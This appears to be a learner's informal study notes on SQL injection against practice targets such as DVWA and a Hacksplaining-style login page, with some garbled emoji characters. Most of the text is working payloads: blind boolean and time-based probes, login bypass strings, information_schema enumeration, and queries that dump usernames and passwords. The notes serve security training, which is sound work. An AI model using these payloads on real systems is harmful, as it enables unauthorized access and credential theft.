Hacksplanning website

email: test
password: 
login

this is the example of the website we wan to inject

first of all:
use single quote to try first got error?
then if blind sql injection 
üîé How to Detect Blind SQL Injection
1. Boolean-based (True/False) detection

Inject something that‚Äôs always true vs. always false.

Example (in DVWA or a test lab):

' AND 1=1--


vs

' AND 1=2--

If 1=1 gives a normal response but 1=2 gives a different response (shorter page, ‚Äúlogin failed‚Äù, missing results), ‚Üí possible boolean-based blind SQLi.

2. Time-based detection
Use a payload that makes the database wait.
Example (MySQL in DVWA):

' AND SLEEP(5)--
If the page response is delayed by ~5 seconds, that means your injection is running in the backend ‚Üí time-based blind SQLi confirmed.

3. Response length/status code changes
In Burp Repeater, compare response length:
True condition ‚Üí 1124 bytes
False condition ‚Üí 1070 bytes
Even if the page ‚Äúlooks the same,‚Äù these tiny changes mean you can infer data.

‚úÖ Signs You Found Blind SQLi

No SQL error messages, but:
Page behaves differently on true/false conditions.
Response size changes between true/false payloads.
Response time changes when using delay functions.





2. Checking the Current Database


select database() --


This command tells you which database is currently being used.

3. Listing Schemas (Databases)

select schema_name 
from information_schema.schemata --

In MySQL:
SELECT schema_name FROM information_schema.schemata;

In PostgreSQL:
SELECT schema_name FROM information_schema.schemata;

In SQL Server:
SELECT name FROM sys.databases;

In Oracle:
SELECT username FROM all_users;

information_schema.schemata is a system table that contains all databases (schemas).
This lets you list every database the server has.

4. Listing Tables in a Database


select table_name 
from information_schema.tables 
where table_schema = 'dvwa' --



This lists all tables inside the dvwa database.
Example: users, guestbook, etc.

5. Listing Columns in a Table


select column_name 
from information_schema.columns 
where table_schema = 'dvwa' 
and table_name = 'users' --

This lists all columns inside the users table.
Example: user_id, username, password, etc.

6. Extracting Data


select user_id, first_name, last_name, user, password 
from users --

Once you know the table + column names, you can dump actual user credentials.

1' and database() like 'd% 
'da%
'dvw keep testing 
'dvwa
burpsuite to 

SELECT *
FROM users
WHERE email='test' AND password='1 'OR 1=1--' (inject 1'OR 1=1--) -- only use when there is an end if not 1 'or '1' = '1 

after know database we can inject something
select concat(user,password) from dvwa.users--

dvwa sql injection change to medium it is now using a variable so no need ' single quote to close it
